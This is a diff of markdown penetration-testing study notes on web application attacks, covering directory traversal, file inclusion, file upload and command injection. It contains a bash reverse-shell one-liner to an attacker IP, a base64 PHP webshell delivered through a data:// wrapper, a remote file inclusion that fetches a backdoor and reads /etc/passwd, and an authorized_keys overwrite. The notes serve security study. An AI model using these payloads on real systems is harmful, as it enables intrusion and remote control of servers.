@@ -1,16 +1,16 @@
 # Module 9: Common Web Application Attacks
 
-### Directory Traversal
+## Directory Traversal
 
-#### Absolute vs Relative Paths
+### Absolute vs Relative Paths
 
-#### Identifying and Exploiting Directory Traversals
+### Identifying and Exploiting Directory Traversals
 
-#### Encoding Special Characters
+### Encoding Special Characters
 
-### File Inclusion Vulnerabilities
+## File Inclusion Vulnerabilities
 
-#### Local File Inclusion (LFI)
+### Local File Inclusion (LFI)
 
 The difference here is that including a local file will execute it rather than read the contents of it. Using Log Poisoning with php and LFI, we can execute commands on the web server.
 
@@ -18,7 +18,7 @@ Taking a look at the previous directory traversal vulnerability, let's see what 
 
 After testing that the cmd parameter works, let's get a reverse shell. We'll need to URL encode the data so it's treated correctly. A simple reverse shell one-liner in bash: `bash -c "bash -i >& /dev/tcp/my.listener.ip.here/port 0>&1"` would be URL encoded as `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.236%2F1337%200%3E%261%22` Another example might be `bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.236/1337+0>%261'%22`
 
-#### PHP Wrappers
+### PHP Wrappers
 
 Include the contents of a file:
 
@@ -39,22 +39,22 @@ PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 $ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
 
-#### Remote File Inclusion (RFI)
+### Remote File Inclusion (RFI)
 
 Kali includes several webshells are `/usr/share/webshells/` that can be used for RFI.
 
 For RFI, you'll need your remote files to be available somewhere. This can easily be done with `python3 -m http.server 80` which will start a listener on port 80 on all your local interfaces. This hosts any files in your current working directory. Example: `curl http://mountaindesserts.com/meteor/index.php?page=http://your.listener.ip.here/simple-backdoor.php&cmd=cat+/etc/passwd`
 
-### File Upload Vulnerabilities
+## File Upload Vulnerabilities
 
-#### Using Executable Files
+### Using Executable Files
 
 Identifying file upload vulnerabilities:
 
 * Can we upload a file in general?
 * Is there file extension limitations? Are they case sensitive? Can we use "legacy" extensions? ex. .phps, .php7
 
-#### Using Non-Executable Files
+### Using Non-Executable Files
 
 When using non-executable files, we _may_ be able to overwrite important files like `.ssh/authorized_keys` for example. Example in Burp Suite's Repeater:
 
@@ -83,9 +83,9 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7b2Apfpf+ynNDsc702r7dotHjS9RH9gF6AvRP9w5SD
 
 ```
 
-### Command Injection
+## Command Injection
 
-#### OS Command Injection
+### OS Command Injection
 
 While communicating with a Windows device vulnerable to command injection, you can use ``(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`` to determine if you're running commands inside a CMD or PowerShell prompt. This would likely need to be URL encoded. If inside PowerShell, PowerCat can be used to create a reverse shell. PowerCat is a PowerShell implementation of Netcat included in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`.
 
